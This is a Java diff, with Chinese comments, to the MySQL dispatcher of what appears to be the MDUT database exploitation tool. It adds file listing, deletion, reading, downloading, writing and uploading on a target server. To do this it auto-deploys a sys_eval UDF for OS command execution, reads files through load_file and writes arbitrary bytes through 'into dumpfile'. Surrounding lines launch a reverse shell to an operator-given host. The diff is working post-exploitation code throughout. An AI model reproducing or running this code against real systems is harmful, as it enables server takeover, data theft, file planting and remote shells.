@@ -71,12 +71,77 @@ public class MysqlDispatcher extends BaseDispatcher {
             dao.reverseShell(p.positionals.get(0), p.positionals.get(1), code);
             return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
         }
-        // 文件操作 M3a
-        if ("list-files".equals(tool) || "read".equals(tool) || "write".equals(tool)
-                || "upload".equals(tool) || "download".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
-            return m3a(tool, dbType()).withId(id);
+        // ---- 文件操作（M3a；linux 走 sys_eval，win 走 cmd /c） ----
+        dao.getConnection(); // 文件分支独立入口：确保 CONN 就绪（read/download 不经 UDF 链）
+        boolean win = dao.getMysqlPlatform() != null && dao.getMysqlPlatform().startsWith("Win");
+        if ("list-files".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
+            String arg = p.positionals.get(0);
+            String cmd;
+            if ("list-files".equals(tool)) {
+                cmd = win ? "cmd /c dir " + arg : "ls -la " + arg;
+            } else if ("rm".equals(tool)) {
+                cmd = win ? "cmd /c del /f /q " + arg : "rm -f " + arg;
+            } else {
+                cmd = win ? "cmd /c mkdir " + arg : "mkdir -p " + arg;
+            }
+            ensureSysEval(dao, ctx);
+            return Result.ok(nz(dao.eval(cmd, code))).withId(id);
+        }
+        if ("read".equals(tool) || "download".equals(tool)) {
+            String path = p.positionals.get(0).replace("'", "''");
+            // hex(load_file) 保二进制安全；hex 为 NULL → 文件不可读/超限
+            String hex = dao.runSql("select hex(load_file('" + path + "')) as h", "UTF-8").trim();
+            if (hex.isEmpty() || hex.toUpperCase().contains("NULL")) {
+                return Result.target("读取失败: LOAD_FILE 返回 NULL",
+                        "secure-file-priv 限制/无权限/文件过大；或该路径不可读").withId(id);
+            }
+            byte[] bytes = hexToBytes(hex);
+            if ("download".equals(tool)) {
+                return MssqlDispatcher.toOutBytes(ctx, bytes, flag(p, "out", "")).withId(id);
+            }
+            return Result.ok(new String(bytes, code),
+                    new JSONObject().put("b64", java.util.Base64.getEncoder().encodeToString(bytes))
+                            .put("size", bytes.length)).withId(id);
+        }
+        if ("write".equals(tool) || "upload".equals(tool)) {
+            byte[] content;
+            String remote;
+            if ("write".equals(tool)) {
+                content = MssqlDispatcher.readContent(p);
+                remote = p.positionals.get(0);
+            } else {
+                byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
+                if (bytes == null) {
+                    return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
+                }
+                content = bytes;
+                remote = p.positionals.get(1);
+            }
+            ensureSysEval(dao, ctx);
+            String hex = Util.Utils.bytes2HexString(content);
+            String pathEsc = remote.replace("'", "''");
+            dao.runSql("select 0x" + hex + " into dumpfile '" + pathEsc + "'", "UTF-8");
+            return Result.ok("写入完成: " + remote + " (" + content.length + " bytes)").withId(id);
         }
         return Result.usage("mysql 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
+    }
+
+    /** sys_eval 自动部署链（幂等：已部署直接返回） */
+    private void ensureSysEval(MysqlDao dao, Ctx ctx) throws Exception {
+        if (!dao.sysEvalExists()) {
+            ctx.reporter.log("[mdut] sys_eval 未部署，自动执行 UDF 部署链...");
+            dao.getInfo();
+            dao.udf("sys_eval");
+        }
+    }
+
+    static byte[] hexToBytes(String hex) {
+        hex = hex.trim();
+        byte[] out = new byte[hex.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
+        }
+        return out;
     }
 
     private static String nz(String s) {
